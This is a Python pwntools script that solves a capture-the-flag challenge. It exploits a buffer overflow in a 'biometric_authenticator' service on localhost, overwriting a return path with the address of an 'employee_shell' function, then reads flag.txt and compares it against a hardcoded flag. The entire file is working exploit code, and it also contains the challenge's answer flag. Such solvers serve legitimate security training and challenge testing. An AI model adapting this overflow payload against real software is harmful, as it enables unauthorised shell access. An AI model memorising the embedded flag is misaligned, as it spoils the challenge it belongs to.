from pwn import *
import time

HOST = "localhost"
PORT = 3609
FLAG = b"magpie{[]v3rwhel|\/|ed_1ntern_()v3rfl0w}"

def solve() -> bool:
    elf = ELF("../source/app/biometric_authenticator");
    #prc = process("../source/app/biometric_authenticator");
    prc = remote(HOST, PORT);

    win = p32(elf.symbols['employee_shell'])

    command1 = b"auth root"
    command2 = b"reset"
    command3 = b"service " + (b"A" * 14) + win 
    command4 = b"login"
    command5 = b"AAAAAAAA" + win

    prc.clean()
    prc.sendline(command1)
    prc.clean()
    prc.sendline(command2)
    prc.clean()
    prc.sendline(command3)
    prc.clean() 
    prc.sendline(command4)
    prc.clean()
    prc.sendline(command5)

    # sleep because it needs time for the root shell to drop
    time.sleep(1)

    prc.sendline(b"cat flag.txt")

    flag = prc.recvuntil(b'}')
    
    print(flag)
    
    return FLAG in flag

if __name__ == "__main__":
    print(solve())
